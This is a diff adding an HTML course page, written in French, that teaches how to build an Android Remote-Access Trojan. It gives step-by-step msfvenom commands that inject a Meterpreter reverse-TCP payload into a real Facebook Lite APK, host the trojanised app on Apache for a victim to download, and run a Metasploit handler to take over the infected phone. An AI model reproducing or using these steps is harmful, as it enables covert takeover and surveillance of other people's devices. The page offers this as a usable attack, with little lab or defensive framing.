@@ -1,0 +1,164 @@
+<h1>RAT</h1>
+
+<h2 class="mb-3">1. Objectif</h2>
+<p>
+	L'objectif de ce cours et de vous familiariser au concept de Remote-Access Trojan (RAT) ainsi que ces applications.
+	</br>
+	</br>
+	Les Remote-Access Trojans (RATs) sont des outils qui permettent à un attaquant d’accéder de façon non autorisée à un
+	appareil (ordinateur, téléphone, etc), et notamment de le contrôler.
+	</br>
+	La plupart des RATs que l’on retrouve aujourd’hui prennent la forme de Malware (Logiciel malveillant) qui vont
+	infecter l’appareil cible, ouvrir ce qu’on appelle une Backdoor qui va permettre à l’attaquant d’accéder sans grande
+	difficulté à l’appareil et en gagner le contrôle.
+	</br>
+	Dans ce tutoriel, nous allons nous créer un RAT à l’aide de l’outil MSFVenom qui va nous permettre d'altérer le
+	fonctionnement d’un Android Package File (APK) de notre choix, pour ensuite l’installer sur un appareil Android et y
+	gagner le contrôle.
+</p>
+
+
+<h2 class="mb-3">2. Configuration</h2>
+<p>
+	Warning: Ce tutoriel fonctionne uniquement sur les anciennes versions d’Android.
+	</br>
+	Avant toute chose, vous devez vous assurer d’avoir installé les modules suivants: apktool, openjdk-11-jdk, et
+	zipalign. Pour ce faire, saisir les commandes suivantes dans le terminal:
+	</br>
+	- (Optionnel mais potentiellement nécessaire): <kbd class="ms-3">sudo apt install apktool</kbd>
+	</br>
+	- apktool: <kbd class="ms-3">sudo apt install apktool</kbd>
+	</br>
+	- apksigner: <kbd class="ms-3">sudo apt install apksigner</kbd>
+	</br>
+	- openjdk-11-jdk: <kbd class="ms-3">sudo apt install openjdk-11-jdk</kbd>
+	</br>
+	- zipalign: <kbd class="ms-3">sudo apt install zipalign</kbd>
+</p>
+
+
+<h2 class="mb-3">3. Les Utilisations</h2>
+
+<h3>I. msfvenom de Metasploit</h3>
+<p>
+	Il existe deux méthodes pour générer le RAT avec l’outil msfvenom:
+	</br>
+	- La première méthode génère un APK automatiquement. Il vous suffira d’entrer dans le terminal la commande:
+	</br>
+	<kbd class="ms-3">sudo msfvenom -p android/meterpreter/reverse_tcp lhost=[Your_Machine_IP]
+		lport=[The_Port_you_want_to_open] R > [RAT_name]</kbd>.
+	</br>
+	- La seconde méthode va injecter du code malicieux dans un APK déjà existant.
+	</br></br>
+	Ici, nous allons faire la seconde méthode. Pour cela, nous devons d’abord nous munir d’une application Android
+	(APK).
+	Dans ce tutoriel, nous allons utiliser une ancienne version de Facebook Lite disponible à l’adresse suivante:
+	<a
+		href="https://www.apkmirror.com/apk/facebook-2/lite/lite-10-0-0-6-140-release/facebook-lite-10-0-0-6-140-android-apk-download/"><u>Facebook
+			Lite 10.0.0.6.140 (noarch) (Android 2.3+)</u></a>
+	</br></br>
+	Une fois l’APK téléchargé, nous allons ouvrir un terminal et nous placer dans le répertoire du fichier et saisir
+	l’instruction suivante:
+	</br>
+	<kbd class="ms-3">sudo msfvenom -x [APK_file_name.apk] -p android/meterpreter/reverse_tcp lhost=[Your_Machine_IP]
+		lport=[The_Port_you_want_to_open] -o [RAT_name]</kbd>
+	</br>
+	Exemple: <kbd class="ms-3">sudo msfvenom -x FacebookLite.apk -p android/meterpreter/reverse_tcp
+		lhost=123.456.789.101 lport=4444 -o RAT.apk</kbd>
+	</br>
+	Appuyez ensuite sur “Entrer” et voilà ! Après quelques instants, votre RAT sera prêt à être déployé sur l’appareil
+	Android de la victime.
+</p>
+
+<img src="Tutoriel/tuto-rat/images/rat0.png" alt="" class="img-fluid">
+<img src="Tutoriel/tuto-rat/images/rat1.png" alt="" class="img-fluid">
+
+<h3>II. Apache2</h3>
+<p>
+	A partir de ce point, les deux méthodes suivent le même schéma.
+	</br>
+	Mais pour ce faire, il faut que le RAT soit accessible par la victime afin qu’elle puisse le télécharger. Pour celà,
+	il suffit d’activer un des serveurs de votre machine tel que apache2, afin de rendre le fichier accessible sur votre
+	réseau ou sur Internet.
+	</br>
+	Voici une méthode d’activation du serveur apache2: <kbd class="ms-3">sudo systemctl start apache2.service</kbd>
+	</br>
+	Il faut ensuite copier le RAT dans le répertoire /var/www/html afin de créer la page web qui permettra de le
+	télécharger.
+</p>
+
+<img src="Tutoriel/tuto-rat/images/rat2.png" alt="" class="img-fluid">
+<img src="Tutoriel/tuto-rat/images/rat3.png" alt="" class="img-fluid">
+
+
+<h3>III. Metasploit</h3>
+<p>
+	Une fois toutes les étapes précédentes effectuées, il ne nous reste plus qu’à entrer dans le terminal l’instruction
+	suivante:
+	</br>
+	<kbd class="ms-3">sudo msfconsole</kbd>
+	</br>
+	Ce qui aura pour but de lancer Metasploit qui va nous permettre d’agir sur la machine de la victime une fois le RAT
+	installé. Vous pouvez afficher la liste des options à l’aide de la commande <kbd class="ms-3">show options</kbd>
+	</br>
+	Une fois Metasploit en marche, entrez l’instruction suivante: <kbd class="ms-3">use exploit/multi/handler</kbd>.
+	</br>
+	Dans le cas ou le Payload ne correspond pas à “android/meterpreter/reverse_tcp”, il faut le configurer en entrant
+	l’instruction: <kbd class="ms-3">set payload android/meterpreter/reverse_tcp</kbd>.
+	</br>
+	Il ne vous reste plus qu’à configurer la machine avec laquelle vous voulez contrôler l’appareil Android en entrant:
+	<kbd class="ms-3">set LHOST [Your_Machine_IP]</kbd>.
+	</br>
+	Exemple: <kbd class="ms-3">set LHOST 123.456.789.101</kbd>.
+	</br>
+	Et enfin, de lancer l’exploit à l’aide de la commande: <kbd class="ms-3">run -j</kbd>.</br>
+</p>
+<img src="Tutoriel/tuto-rat/images/rat4.png" alt="" class="img-fluid">
+<img src="Tutoriel/tuto-rat/images/rat5.png" alt="" class="img-fluid">
+<img src="Tutoriel/tuto-rat/images/rat6.png" alt="" class="img-fluid">
+<img src="Tutoriel/tuto-rat/images/rat7.png" alt="" class="img-fluid">
+
+<h3>IV. Final Steps</h3>
+<p>
+	Maintenant, à l’aide d’un appareil Android, nous allons installer le RAT créé précédemment afin d’en voir les
+	effets.
+	</br>
+	Pour celà, recherchez sur internet l’endroit où vous avez placé votre fichier RAT. Si vous avez suivi ce tutoriel à
+	la lettre, votre RAT est placé dans le répertoire /var/www/html, il sera donc accessible à l'adresse
+	[Your_Machine_IP]/[RAT_name].
+	</br>
+	Par exemple, si l'adresse IP de la machine attaquante est 123.456.789.101 et que le nom du RAT est RAT.apk, le
+	fichier sera téléchargeable à l’adresse 123.456.789.101/RAT.apk.
+	</br>
+	Une fois l’application téléchargée, retournez sur votre terminal.
+	</br>
+	Si tout s’est bien passé, la commande “sessions” va vous permettre d’afficher la liste des appareils infectés dont
+	la connexion est possible.
+	</br>
+	Dans notre cas (voir la vidéo), notre session est la numéro 1. Pour se connecter à une session, il suffit d’entrer
+	la commande <kbd class="ms-3">sessions -i [Session_Number]</kbd>
+	</br>
+	Une fois connecté à l’appareil Android, la commande <kbd class="ms-3">help</kbd> vous permettra de voir la liste des
+	instructions que l’on peut donner à l’appareil infecté!
+</p>
+
+<h3>Sources & Crédits</h3>
+
+Nous nous sommes inspirés de plusieurs sources pour la rédation de ce cours. Vous trouverez dans cette section les liens
+vers les articles ou vidéos qui nous on servit lors de la rédation.
+</br></br>
+Créer un RAT avec la deuxième méthode: <a href="https://www.youtube.com/watch?v=Lzkfqq23LZ0"><u>How To Protect Your
+		Phone From Hackers!?</u></a>
+</br>
+Créer un RAT avec la première méthode: <a href="https://www.youtube.com/watch?v=g77XXAKc9qA"><u>Access Android with
+		Msfvenom (Cybersecurity)</u></a>
+</p>
+
+
+<h2 class="mb-3">4. Bonus : vidéo démonstration</h2>
+<p>
+	Vous trouverez ci-dessous une vidéo de démonstration:
+</p>
+<iframe width="420" height="315"
+src="https://youtu.be/6CHggnzC-Ak">
+</iframe>
